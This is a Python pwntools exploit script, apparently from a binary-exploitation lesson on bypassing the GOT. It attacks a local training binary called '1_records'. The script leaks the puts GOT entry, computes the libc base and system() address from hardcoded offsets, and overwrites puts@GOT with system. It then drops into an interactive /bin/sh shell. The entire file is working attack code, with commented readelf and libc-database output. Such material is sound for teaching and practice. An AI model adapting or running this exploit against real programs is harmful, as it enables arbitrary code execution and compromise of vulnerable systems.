#!/usr/bin/python

from pwn import *

def main(): 
	p = process("./1_records") 

	'''
	vagrant@ubuntu-xenial:~/lessons/10_bypass_got/build$ readelf -r ./1_records | grep puts
	0804a018  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
	'''
	# Craft first stage(arbitrary read)
	leak_address = p32(0x0804a018) # address of puts
	command = "/bin//sh" # Little endian: 0x6e69622f -> \x6e\x69\x62\x2f , 0x68732f2f -> \x68\x73\x2f\x2f 
	stage_1 = command.ljust(24, "\x00") + leak_address # fill unused space with 0 to terminate /bin/sh
	p.recvrepeat(0.2)

	# Sends the first stage
	p.send(stage_1)

	# Parse the response 
	data = p.recvrepeat(0.2)
	leak = data[ data.find("(") +1 : data.rfind(")") ] # Only the strings between the bracket -> ()
	log.info("Got leaked data -> %s" %leak)
	
	puts_addr = u32( leak[:4] )
	log.info("puts@libc: 0x%x" %puts_addr) 

	# Calculate libc base and system
	puts_offset = 0x5fca0 
	libc_base = puts_addr - puts_offset
	log.info("libc base: 0x%x" %libc_base) 

	'''
	vagrant@ubuntu-xenial:~/libc-database$ ./dump local-568c528bd0d4ab9279ab140a11c9b138487e41ee|grep system
	offset_system = 0x0003ada0
	'''
	system_offset = 0x3ada0
	system_addr = libc_base + system_offset 
	log.info("system@libc: 0x%x" %system_addr)

	# Overwrite puts@got with system
	ret_addr = p32(system_addr)
	p.send(ret_addr)

	# Print pid
        raw_input( str(p.proc.pid) )
	
	# Pass interaction back to user
	p.interactive()	


if __name__ == "__main__":
	main()
